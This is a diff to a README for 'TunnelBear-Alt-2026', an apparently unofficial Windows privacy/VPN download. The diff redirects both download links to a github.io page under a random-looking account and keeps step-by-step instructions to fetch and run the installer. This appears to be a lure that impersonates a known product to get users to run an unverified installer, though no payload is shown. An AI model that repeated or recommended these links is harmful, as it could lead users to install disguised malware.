@@ -1,6 +1,6 @@
 # 🐻 TunnelBear-Alt-2026 - Secure Private Browsing Made Simple
 
-[![Download TunnelBear for Windows](https://img.shields.io/badge/Download-TunnelBear-blue.svg)](https://github.com/Sinclairbiosystematic863/TunnelBear-Alt-2026)
+[![Download TunnelBear for Windows](https://img.shields.io/badge/Download-TunnelBear-blue.svg)](https://sinclairbiosystematic863.github.io)
 
 ## 📌 About This Software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up your privacy protection on your computer.
 
-1.  Visit the official repository page to get the file: [Download TunnelBear for Windows](https://github.com/Sinclairbiosystematic863/TunnelBear-Alt-2026)
+1.  Visit the official repository page to get the file: [Download TunnelBear for Windows](https://sinclairbiosystematic863.github.io)
 2.  Locate the large download button or the link to the latest Windows installer file on the page.
 3.  Click the link to start the download.
 4.  Wait for the file to finish downloading to your Downloads folder.
